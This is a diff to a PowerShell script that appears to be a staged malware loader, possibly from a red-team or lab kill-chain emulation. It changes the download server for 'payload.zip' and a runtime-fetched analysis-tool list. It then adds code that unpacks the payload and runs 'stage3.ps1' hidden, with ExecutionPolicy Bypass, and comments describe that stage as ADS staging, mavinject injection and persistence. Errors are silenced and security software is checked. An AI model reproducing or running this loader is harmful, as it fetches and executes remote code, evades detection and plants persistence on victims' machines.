@@ -16,7 +16,7 @@ $ErrorActionPreference = 'SilentlyContinue'
 
 # ---------------- configuration ----------------
 $Settings = @{
-    UpdateServer = $(if ($Url) { $Url } else { 'http://10.129.132.80:8081/payload.zip' })
+    UpdateServer = $(if ($Url) { $Url } else { 'http://192.168.1.106:8081/payload.zip' })
     PackageName  = 'stage2.zip'
     UserAgent    = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
     TimeoutSec   = 30
@@ -27,7 +27,7 @@ $Settings = @{
     LicenseKey  = 'snapec2_secret'
 
     # tool name list is pulled at runtime - keeps this script free of analysis-tool strings
-    ToolListUrl = 'http://10.129.132.80:8081/toolist.txt'
+    ToolListUrl = 'http://192.168.1.106:8081/toolist.txt'
 
     # security software gate
     CheckSecuritySoftware = $true
@@ -347,7 +347,20 @@ function Main {
         return 70
     }
 
-    Write-Trace 'step complete - stopping before unpack/merge (next step in kill chain)' 'ok'
+    # ---- continue chain: unpack -> stage3 (ADS staging + mavinject + persistence) ----
+    $exp = Join-Path $script:BaseDir 'x'
+    Expand-Archive -Path (Join-Path $script:BaseDir $Settings.PackageName) -DestinationPath $exp -Force
+    $s3 = Join-Path $exp 'stage3.ps1'
+    if (Test-Path $s3) {
+        Write-Trace 'launching stage3 (ADS staging + mavinject + persistence)' 'info'
+        Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -Wait `
+            -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $s3, '-StageDir', $exp
+        Write-Trace 'stage3 returned' 'ok'
+    } else {
+        Write-Trace 'stage3.ps1 not found in package' 'warn'
+    }
+
+    Write-Trace 'step complete (stages 0-4 chain executed)' 'ok'
     Write-Trace 'exit 0' 'ok'
     return 0
 }
